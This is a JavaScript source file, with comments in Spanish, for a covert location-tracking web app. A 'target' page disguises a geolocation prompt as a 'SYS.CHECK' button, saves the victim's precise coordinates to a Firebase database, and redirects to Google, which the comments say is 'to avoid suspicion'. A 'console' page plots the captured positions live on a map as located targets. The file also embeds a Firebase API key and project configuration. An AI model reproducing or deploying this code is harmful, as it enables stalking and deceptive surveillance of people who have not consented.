// --- CONFIGURACIÓN DE FIREBASE ---
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc, getDocs, onSnapshot } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
  authDomain: "spideytracker-591bb.firebaseapp.com",
  projectId: "spideytracker-591bb",
  storageBucket: "spideytracker-591bb.firebasestorage.app",
  messagingSenderId: "923704989530",
  appId: "1:923704989530:web:74debc7597acbc80a00563",
  measurementId: "G-RFC57L9T0Y"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// --- LÓGICA DE LA APLICACIÓN ---
document.addEventListener("DOMContentLoaded", () => {
    const sysCheckBtn = document.getElementById("sysCheckBtn"); // El botón renombrado a "SYS.CHECK"
    const mapContainer = document.getElementById("map");

    // Detectar si estamos en la vista de consola o en la vista del objetivo
    if (mapContainer) {
        // --- MODO CONSOLA (Visualización de Arañas 🕷️) ---
        const map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);

        // Icono personalizado con la araña
        const spiderIcon = L.divIcon({
            className: 'spider-marker',
            html: '<div style="font-size: 24px;">🕷️</div>',
            iconSize: [30, 30],
            iconAnchor: [15, 15]
        });

        // Escuchar cambios en tiempo real en la colección de Firestore
        onSnapshot(collection(db, "locations"), (snapshot) => {
            snapshot.docChanges().forEach((change) => {
                if (change.type === "added") {
                    const data = change.doc.data();
                    const lat = data.latitude;
                    const lng = data.longitude;
                    const timestamp = data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString() : 'Justo ahora';

                    // Agregar el marcador de la araña al mapa
                    L.marker([lat, lng], { icon: spiderIcon })
                        .addTo(map)
                        .bindPopup(`<b>¡Objetivo localizado!</b><br>Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}<br>Hora: ${timestamp}`);

                    // Centrar el mapa en el punto más reciente
                    map.setView([lat, lng], 15);
                }
            });
        });

    } else if (sysCheckBtn) {
        // --- MODO OBJETIVO (Captura discreta y redirección) ---
        sysCheckBtn.addEventListener("click", () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        try {
                            // Guardar cada punto de forma independiente usando addDoc (evita sobreescrituras)
                            await addDoc(collection(db, "locations"), {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                timestamp: new Date()
                            });
                        } catch (e) {
                            console.error("Error al registrar posición", e);
                        }
                        // Redirección inmediata a Google para evitar sospechas
                        window.location.href = "https://www.google.com";
                    },
                    (error) => {
                        // Si rechaza el permiso, redirigir de igual manera
                        window.location.href = "https://www.google.com";
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                window.location.href = "https://www.google.com";
            }
        });
    }
});
